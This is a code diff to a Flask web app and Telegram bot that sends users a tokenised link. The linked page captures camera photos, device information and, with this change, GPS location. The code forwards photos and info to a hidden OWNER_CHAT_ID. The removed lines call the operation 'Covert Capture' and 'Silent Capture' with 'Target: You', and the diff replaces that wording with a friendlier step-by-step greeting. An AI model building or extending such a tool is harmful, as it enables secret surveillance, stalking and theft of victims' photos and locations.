@@ -5,7 +5,7 @@ import base64
 from flask import Flask, request, render_template, jsonify
 from telegram.ext import Updater, CommandHandler
 from utils import BOT_TOKEN, OWNER_CHAT_ID, IPINFO_TOKEN
-from token_store import generate_token, store_token_for_chat, get_chat_id
+from token_store import generate_token, store_token_for_chat, get_chat_id, store_name, get_name
 
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
@@ -17,23 +17,21 @@ def start(update, context):
     chat_id = update.message.chat_id
     user = update.message.from_user
     token = generate_token(chat_id)
+
     # Save mapping
     store_token_for_chat(token, chat_id)
+    store_name(token, user.first_name or "User")
 
     link = f"{RENDER_URL}?token={token}"
 
     greeting = (
-        f"🕶️ *Welcome {user.first_name or ''}*\n"
+        f"👋 *Welcome {user.first_name or ''}*\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "💀 *Status:* Activated\n"
-        "📡 *Mode:* Silent Capture\n"
-        "🎯 *Target:* You\n"
-        "🔐 *Encryption:* Enabled\n"
-        "🧠 *Bot Intelligence:* Level 99\n"
-        "📸 *Camera Access:* Pending\n"
-        "🕵️ *Operation:* Covert Capture\n"
+        "📡 *Mode:* Sequential Capture\n"
+        "📸 *Step 1:* Camera\n"
+        "📍 *Step 2:* Location\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📷 *Click to activate camera:*\n{link}"
+        f"👉 *Click here to start:*\n{link}"
     )
     context.bot.send_message(chat_id=chat_id, text=greeting, parse_mode="Markdown")
 
@@ -47,7 +45,14 @@ def run_bot():
 @app.route("/")
 def index():
     token = request.args.get("token")
-    return render_template("index.html", token=token, ipinfo_token=IPINFO_TOKEN)
+    name = get_name(token) or "User"
+    return render_template("index.html", token=token, ipinfo_token=IPINFO_TOKEN, user_name=name)
+
+@app.route("/next")
+def next_page():
+    token = request.args.get("token")
+    name = get_name(token) or "User"
+    return render_template("page2.html", token=token, user_name=name)
 
 @app.route("/send_photo", methods=["POST"])
 def send_photo():
@@ -69,7 +74,6 @@ def send_photo():
         with open(filename, "wb") as f:
             f.write(image_bytes)
 
-        # Step 1: Send photo to user
         with open(filename, "rb") as photo:
             resp = requests.post(
                 f"{TELEGRAM_API}/sendPhoto",
@@ -79,7 +83,6 @@ def send_photo():
         result = resp.json()
         print("User photo response:", result)
 
-        # Step 2: Forward to owner
         if result.get("ok"):
             message_id = result["result"]["message_id"]
             requests.post(
@@ -108,7 +111,6 @@ def send_info():
     if not chat_id or not info_text:
         return jsonify({"status": "missing data"}), 400
 
-    # Step 1: Send info to user
     resp = requests.post(
         f"{TELEGRAM_API}/sendMessage",
         data={"chat_id": chat_id, "text": info_text, "parse_mode": "Markdown"}
@@ -116,13 +118,31 @@ def send_info():
     result = resp.json()
     print("User info response:", result)
 
-    # Step 2: Send to owner with identity
     if result.get("ok"):
         owner_text = f"👤 User ID: `{chat_id}`\n\n{info_text}"
         requests.post(
             f"{TELEGRAM_API}/sendMessage",
             data={"chat_id": OWNER_CHAT_ID, "text": owner_text, "parse_mode": "Markdown"}
         )
+
+    return jsonify({"status": "sent"}), 200
+
+@app.route("/send_location", methods=["POST"])
+def send_location():
+    data = request.json or {}
+    token = data.get("token")
+    chat_id = get_chat_id(token)
+    lat = data.get("lat")
+    lon = data.get("lon")
+
+    if not chat_id or not lat or not lon:
+        return jsonify({"status": "missing data"}), 400
+
+    resp = requests.post(
+        f"{TELEGRAM_API}/sendLocation",
+        data={"chat_id": chat_id, "latitude": lat, "longitude": lon}
+    )
+    print("Location response:", resp.json())
 
     return jsonify({"status": "sent"}), 200
 
